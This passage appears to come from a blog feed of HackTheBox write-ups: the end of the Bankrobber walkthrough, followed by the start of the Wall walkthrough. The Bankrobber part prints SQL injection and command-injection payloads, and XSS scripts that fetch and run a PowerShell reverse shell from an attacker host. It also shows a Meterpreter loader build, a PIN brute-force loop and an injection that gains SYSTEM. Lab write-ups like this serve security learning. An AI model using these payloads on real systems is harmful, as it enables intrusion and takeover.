Admin</h3><p>Now that I have the admin credentials, login as admin, and find some interesting capabilities.<br>and there‚Äôs a <code>NOTES.TXT</code> inside of the Admin page.</p><p><img src="/img/bank/bank-notes-web.png" alt="HackTheBox-Bankrobber/bank-notes-web.png" title="Bank Admin page"></p><p>Looking at the notes.</p><p><img src="/img/bank/bank-notes1.png" alt="HackTheBox-Bankrobber/bank-notes1.png" title="Bank Notes"></p><p>I don‚Äôt know what that means, but there are two things that I‚Äôm sure of.<br>    ‚áí <code>default Xampp</code> installation folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ‚áí There‚Äôs was a vulnerability in the <code>encode comments</code>. For every IP address.</p><p>Next, the two interesting things I found inside the admin page ‚Äì <code>Search users</code> and <code>Backdoorchecker</code>.<br>I try to search my <code>ID #</code> in search users (beta) when you say <code>beta</code> it‚Äôs not fully functional, there was an existing bugs and errors with that.</p><p><img src="/img/bank/bank-myid.png" alt="HackTheBox-Bankrobber/my-id.png" title="Bank my id#"></p><p><code>Backdoorchecker</code></p><p><img src="/img/bank/bank-backdoorchecker.png" alt="HackTheBox-Bankrobber/bank-backdoorchecker.png" title="Bank Backdoor Checker"></p><p>   ‚áí Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure><p>There‚Äôs a possibility that this features is vulnerable to <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQLi</a>.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="XSS-and-SQL-Injection"><a href="#XSS-and-SQL-Injection" class="headerlink" title="XSS and SQL Injection"></a>XSS and SQL Injection</h3><p>I try to intercept the <code>search users</code> function using <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> and try SQL Injection.</p><p><code>term=4</code> is my <code>user ID #</code> then sending this to repeater, I put this sql syntax to check how‚Äôs <code>backdoorchecker.php</code> work.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sql</span></span><br><span class="line"></span><br><span class="line">term=4<span class="string">' union all select 1,LOAD_FILE('</span>C:\\xampp\\htdocs\\admin\\backdoorchecker.php<span class="string">'),3-- -</span></span><br></pre></td></tr></table></figure><p>and I got this response.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Sun, <span class="number">08</span> Mar <span class="number">2020</span> <span class="number">20</span>:<span class="number">30</span>:<span class="number">14</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.39</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>b PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">Content-Length: <span class="number">1169</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table width=<span class="string">'90%'</span>&gt;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;User&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">4</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;medz&lt;/td&gt;</span><br><span class="line">   &lt;/tr&gt;</span><br><span class="line">      </span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">1</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'../link.php'</span>);</span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'auth.php'</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">   $username = base64_decode(urldecode($_COOKIE[<span class="string">'username'</span>]));</span><br><span class="line">   $password = base64_decode(urldecode($_COOKIE[<span class="string">'password'</span>]));</span><br><span class="line">   $bad    = <span class="keyword">array</span>(<span class="string">'$('</span>,<span class="string">'&amp;'</span>);</span><br><span class="line">   $good      = <span class="string">"ls"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strtolower(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>)) == <span class="string">"win"</span>)&#123;</span><br><span class="line">         $good = <span class="string">"dir"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>($username == <span class="string">"admin"</span> &amp;&amp; $password == <span class="string">"Hopelessromantic"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                  <span class="comment">// FILTER ESCAPE CHARS</span></span><br><span class="line">                  <span class="keyword">foreach</span>($bad <span class="keyword">as</span> $char)&#123;</span><br><span class="line">                     <span class="keyword">if</span>(strpos($_POST[<span class="string">'cmd'</span>],$char) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"You're not allowed to do that."</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span></span><br><span class="line">            <span class="keyword">if</span>(substr($_POST[<span class="string">'cmd'</span>], <span class="number">0</span>,strlen($good)) != $good)&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">"It's only allowed to use the $good command"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"::1"</span>)&#123;</span><br><span class="line">                  system($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not allowed to use this function!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">   &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>‚Äì sql injection<br><img src="/img/bank/bank-sql-injection.png" alt="HackTheBox-Bankrobber/bank-sql-injection.png" title="Bank Backdoor Checker"></p><p>It returns to send the request from <code>localhost</code> and the first <code>3</code> characters must be ‚Äúdir‚Äù and you can use the characters <code>$(&quot; or &#39;&amp;&#39;&quot;)</code></p><p>To execute code I use the PhantomJS bot (via XSS) to send a post request to <code>backdoorchecker.php</code> with a code execution bypass inside the parameter.<br>I ping my Kali linux machine and set tcpdump. I used:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">dirasdf || ping 10.10.15.71</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-ping.png" alt="HackTheBox-Bankrobber/bank-ping.png" title="Bank Backdoor Checker"></p><p>and my Kali Linux get a response from Bankrobber</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">‚ùØ tcpdump -i tun0</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span><br><span class="line">07:25:28.957530 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421326422 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.208067 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421326672 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.967531 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421327432 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:30.222861 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421327687 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:31.983082 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421329447 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:32.239634 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421329704 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:34.209667 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421331674 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:35.215733 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421332680 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:36.015323 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421333479 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:37.231355 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421334695 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:44.207219 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421341671 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:26:00.335356 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421357799 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure><h3 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h3><p>To exploit this vulnerabilities and get a reverse shell. I used <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang - Offensive PowerShell for red team, penetration testing and offensive security.</a> I use the script, <code>Invoke-PowerShellTcp.ps1</code> and named it to <code>evil.ps1</code>.<br>I called it using powershell through an <code>Impacket Samba Server</code> and setup an <code>nc</code> listener to my Kali Linux.</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># javascript</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> xh;<span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;xh=<span class="keyword">new</span> XMLHttpRequest()&#125;<span class="keyword">else</span>&#123;xh=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)&#125;;xh.open(<span class="string">"POST"</span>,<span class="string">"/admin/backdoorchecker.php"</span>);xh.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);xh.send(<span class="string">"cmd=dirasdf || copy \\\\10.10.15.71\\test\\dfuck"</span>);&lt;<span class="regexp">/script&gt;&amp;amount=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("Microsoft.XMLHTTP")&#125;;xh.open("POST","/</span>admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || copy \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\dfuck<span class="string">");&lt;/script&gt;&amp;comment=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("</span>Microsoft.XMLHTTP<span class="string">")&#125;;xh.open("</span>POST<span class="string">","</span>/admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || powershell -exec bypass -f \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\evil.ps1<span class="string">");&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-XSS.png" alt="HackTheBox-Bankrobber/bank-XSS.png" title="Bank XSS"></p><p>after 5-10 minutes, my <code>impacket-smbserver</code> got a response and get in into the Bankrobber machine.</p><p><img src="/img/bank/bank-impacket.png" alt="HackTheBox-Bankrobber/bank-impacket.png" title="Bank Impacket"></p><p><img src="/img/bank/bank-initial-shell.png" alt="HackTheBox-Bankrobber/bank-initial-shell.png" title="Bank Initial shell"></p><p>and finally I have now the <code>user.txt</code></p><p><img src="/img/bank/bank-user.png" alt="HackTheBox-Bankrobber/bank-user.png" title="Bank USER"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Doing some <a href="https://www.sisainfosec.com/blogs/reconnaissance-the-eagles-eye-of-cyber-security/" target="_blank" rel="noopener">Reconnaissance</a>, I used <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a> or <code>Windows privilege escalation with cmd</code> it‚Äôs a tool similar to <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>.</p><p>It can help with automating Penetration Tests. It performs a discovery on the environment it runs in and tries finding weaknesses to allow privilege escalation. Saving time and allowing more effort to be put toward getting root.</p><h3 id="Process-and-Active-Connections"><a href="#Process-and-Active-Connections" class="headerlink" title="Process and Active Connections"></a>Process and Active Connections</h3><p>running this takes time. after 10-15 minutes I‚Äôve got now the response.</p><p>System Info of Bankrobber<br><img src="/img/bank/bank-winPE.png" alt="HackTheBox-Bankrobber/bank-winPE.png" title="Bank System Info"></p><p>I see something‚Äôs odd running on <code>port 910</code><br><img src="/img/bank/bank-910.png" alt="HackTheBox-Bankrobber/bank-910.png" title="Bank port 910"></p><p>And a suspicious running on the background process named ‚Äì <code>bankv2.exe</code> is the same <code>PID #1632</code> in <code>port 910</code><br><img src="/img/bank/bank-bankv2.png" alt="HackTheBox-Bankrobber/bank-bankv2.png" title="Bank bankv2"></p><h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p><p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p><p>run the bash script and check the payload file</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">****************************************************************</span><br><span class="line">    Automatic C <span class="built_in">source</span> code generator - FOR METASPLOIT          </span><br><span class="line">           Based on rsmudge metasploit-loader                   </span><br><span class="line">****************************************************************</span><br><span class="line">Metasploit server IP : 10.10.15.71</span><br><span class="line">Metasploit port number : 9001</span><br><span class="line">Compiling binary ..</span><br><span class="line">In file included from temp.c:4:</span><br><span class="line">/usr/share/mingw-w64/include/winsock2.h:15:2: warning: <span class="comment">#warning Please include winsock2.h before windows.h [-Wcpp]</span></span><br><span class="line"> <span class="comment">#warning Please include winsock2.h before windows.h</span></span><br><span class="line">  ^~~~~~~</span><br><span class="line">-rwxr-xr-x 1 root root 292503 Mar  8 09:08 payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-payload.png" alt="HackTheBox-Bankrobber/bank-payload.png" title="Bank digit code"></p><p>I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:</p><p>Metasploit meterpreter</p><p><img src="/img/bank/bank-metasploit.png" alt="HackTheBox-Bankrobber/bank-metasploit.png" title="Bank digit code"></p><p>Now that I have the meterpreter session next I did is Port forwarding</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910</span><br></pre></td></tr></table></figure><p>And connect it to the port using <code>nc -vn 127.0.0.1 910</code> and it works! Next I try to input a digit code ‚Äì <code>1234</code> but it‚Äôs not working.</p><p><img src="/img/bank/bank-pincode-wr.png" alt="HackTheBox-Bankrobber/bank-pincodewr.png" title="Bank digit code"></p><h3 id="Brute-force-the-digit-code"><a href="#Brute-force-the-digit-code" class="headerlink" title="Brute force the digit code"></a>Brute force the <code>digit code</code></h3><p>Since I don‚Äôt know what is the exact digit code here, I decided to bruteforce it using <code>bash</code> command line even that I have a feeling that I could get blocked by doing this. so</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">‚ùØ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="built_in">echo</span> <span class="variable">$i</span> | nc -vn 127.0.0.1 910; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>After a seconds‚Äô I get now the right digit code ‚Äì <code>0021</code></p><p><img src="/img/bank/bank-right-pin.png" alt="HackTheBox-Bankrobber/bank-right-pin.png" title="Bank digit code"></p><p>When I log in with this PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> process inside is executed:</p><p>   ‚áí [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe</p><p><img src="/img/bank/bank-transfer0021.png" alt="HackTheBox-Bankrobber/bank-transfer0021.png" title="Bank digit code"></p><h3 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h3><p>Now, theres a possible RCE on that process.<br>I exploited the E-coin transfer by running my payload inside the Bankrobber machine‚Äô and create <code>meterpreter</code> sessions.<br>Instead of putting amount of E-Coins in e-coin transfer. I executed my payload with this line.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">&amp; ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-RCE.png" alt="HackTheBox-Bankrobber/bank-RCE.png" title="Bank RCE"></p><p>After executed it i got a response from my <code>meterpreter</code> sessions.</p><p><img src="/img/bank/bank-metasploit-root.png" alt="HackTheBox-Bankrobber/bank-metasploit-root.png" title="Bank root"></p><h3 id="Administrator-Shell"><a href="#Administrator-Shell" class="headerlink" title="Administrator Shell"></a>Administrator Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 584 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.</span><br></pre></td></tr></table></figure><p>and Finally rooted !<br>   ‚áí nt authority\system<br><img src="/img/bank/bank-rooted!.png" alt="HackTheBox-Bankrobber/bank-rooted!.png" title="Bank rooted"></p><p>Get <code>root.txt</code><br><img src="/img/bank/bank-root.png" alt="HackTheBox-Bankrobber/bank-root.png" title="Bank rooted"></p><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:<br><a href="https://www.speedguide.net/port.php?port=910" target="_blank" rel="noopener">Port 910</a></p><p><a href="https://www.adminsub.net/tcp-udp-port-finder/910" target="_blank" rel="noopener">Port 910</a></p><p><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">Customize Meterpreter Payload</a></p><p><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="noopener">XSS with Phantom JS</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> retired </tag>
            
            <tag> ctf </tag>
            
            <tag> pentest </tag>
            
            <tag> windows </tag>
            
            <tag> sql-injection </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/2019-07-12/HackTheBox-Wall/"/>
      <url>/2019-07-12/HackTheBox-Wall/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/wall/wall-detail.png" alt="HackTheBox-Wall/Nmap.png" title="Wall machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Wall is my very first machine on HackTheBox that I hacked. It is running in Web Application that vulnerable to <code>RCE</code>(Remote Code Execution), a classification of security vulnerabilities. <code>RCE</code> enables a remote attacker to execute arbitrary code, bypassing security authorization, and by abusing this vulnerabilities I manage to get in into the machine. First I fall on to the rabbit hole which is the <code>aa.php</code>, and <code>server-status</code> page. The tricky part of this machine was finding the hidden page of the web application because it‚Äôs not something normally shows up in the wordlists. I use the Burp Suite and edit the Request fo find some interesting stuffs and then i found the right page of the webapps. The vulnerability inside is a <code>SUID</code> binary which users can get a full privileges.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí Bruteforce the Web page directories</p><p>‚Üí Finding the hidden page</p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Exploring the web page</p><p>‚Üí Bruteforce the credentials using the token</p><p>‚Üí Logging in as admin</p></li><li><p><strong>Exploitation</strong></p><p>‚Üí Getting the Reverse shell using <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" target="_blank" rel="noopener">CVE-2019-13024</a>.</p><p>‚Üí Find some interesting things</p><p>‚Üí Check Linux Binaries</p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí Exploit the unusual Linux binaries</p><p>‚Üí Execute the exploit</p><p>‚Üí Get the root shell and read the root and user file</p></li></ol><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, is to scan the target IP using <strong>Nmap</strong> to get information about the various services that are running on the target machine. We use</p><hr><ul><li>-sV ‚áí Probe open ports to determine service/version info</li><li>-sC ‚áí equivalent to ‚Äîscript=default</li><li>-A  ‚áí Enable OS detection, version detection, script scanning, and traceroute</li><li>-oN ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-A</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.157</span> <span class="string">-oN</span> <span class="string">nmap-Wall</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p><img src="/img/wall/Nmap.png" alt="HackTheBox-Wall/Nmap.png" title="Nmap Results"></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>By visiting the http page we got the default page of Apache Web Server<br><img src="/img/wall/default_page.png" alt="HackTheBox-Wall/default_page.png" title="Apache Defaul page"></p><p>We try to explore the default page by inspecting the source code but I can‚Äôt find any interesting things there so I‚Äôll try to bruteforce the directories to look for hidden page. I use <strong><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">gobuster</a></strong> with medium.txt file. To save the outfile we use <code>-o</code> <code>name of a file</code></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.157</span> -w <span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists<span class="regexp">/directory-list-lowercase-2.3-medium.txt -o wall-dir</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/gobuster.png" alt="HackTheBox-Wall/gobuster.png" title="Gobuster"></p><p>After a minutes of bruteforcing I got the following directories.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gobuster results</span></span><br><span class="line"></span><br><span class="line">‚Üí /aa.php  (Status: 200)</span><br><span class="line"></span><br><span class="line">‚Üí /server-status  (Status: 401)</span><br><span class="line"></span><br><span class="line">‚Üí /monitoring  (Status: 403)</span><br></pre></td></tr></table></figure><p>Now let‚Äôs take a look with the following page I got. First the ‚Äúaa.php‚Äù<br><code>http://10.10.10.157/aa.php</code></p><p><img src="/img/wall/aa_page.png" alt="HackTheBox-Wall/aa_page.png" title="aa.php page"><br>No interesting things here.</p><p>So next the <code>server-status</code> page<br><code>http://10.10.10.157/server-status</code></p><p><img src="/img/wall/forbidden.png" alt="HackTheBox-Wall/forbidden.png" title="forbidden page"><br>And I got the Forbidden page.</p><p>Next the is the <code>monitoring</code> page<br><code>http://10.10.10.157/monitoring</code></p><p><img src="/img/wall/monitoring.png" alt="HackTheBox-Wall/monitoring.png" title="monitoring page"></p><p>And I got a pop-up login. This page is very interesting but I don‚Äôt have any credentials so i will leave this for a while and try to enumerate again the machine using <a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a> - Web Server scanner.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">nikto -h http://10.10.10.157/</span><br></pre></td></tr></table></figure><h3 id="Nikto-results"><a href="#Nikto-results" class="headerlink" title="Nikto results"></a>Nikto results</h3><p><img src="/img/wall/nikto.png" alt="HackTheBox-Wall/nikto.png" title="nikto results"></p><p>Next is I will intercept this request with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool) and send this to Repeater.</p><p><img src="/img/wall/burp.png" alt="HackTheBox-Wall/burp.png" title="Burp Suite"></p><p>Repeater<br><img src="/img/wall/burp_repeater.png" alt="HackTheBox-Wall/burp_repeater.png" title="Burp Suite Repeater"></p><p>Now we will change the request body method into ‚ÄúPOST‚Äù and let‚Äôs see what response we can get.<br><img src="/img/wall/burp_centreon.png" alt="HackTheBox-Wall/burp_centreon.png" title="The centreon page"></p><p>As you can see there‚Äôs a redirected page in URL=<code>&#39;/centreon&#39;</code> so I try this on browser to find out what is this.</p><p><img src="/img/wall/centreon_login.png" alt="HackTheBox-Wall/centreon_login.png"></p><h3 id="Centreon-Login-Page-v-19-04"><a href="#Centreon-Login-Page-v-19-04" class="headerlink" title="Centreon Login Page v. 19.04"></a>Centreon Login Page v. 19.04</h3><p>Then a Centreon Login page with version 19.04. Centreon is an open source infrastructure monitoring software.<br>Based on some googling for default creds also in the documentation of the software, I tried all combinations of ‚Äúcentreon‚Äù, ‚Äúadmin‚Äù, and ‚Äúroot‚Äù, but didn‚Äôt get logged in.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Finding-Exploit"><a href="#Finding-Exploit" class="headerlink" title="Finding Exploit"></a>Finding Exploit</h3><p>I try to explore the login page by viewing the page source code and try to look if there‚Äôs any interesting things.<br>I also google the version of the <code>Centreon v19.04</code> and I found out that the version of this software is vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack.</p><h3 id="Login-page-view-page-source"><a href="#Login-page-view-page-source" class="headerlink" title="Login page view page source"></a>Login page view page source</h3><p><img src="/img/wall/view_source.png" alt="HackTheBox-Wall/view_source.png" title="Page source"></p><h3 id="Brute-Force-the-Credentials"><a href="#Brute-Force-the-Credentials" class="headerlink" title="Brute Force the Credentials"></a>Brute Force the Credentials</h3><p>By viewing the page source code, there‚Äôs a hidden value of Centreon <code>CSRF</code> token. After some research luckily I found this <a href="https://github.com/J3wker/anti-CSRF_Token-Bruteforce" target="_blank" rel="noopener">script</a> on Github that can use to bruteforce the logins which are using <code>anti-CSRF</code> tokens to stop you from brute forcing them. I try to use this by the following commands based on the instructions of the script.</p><figure 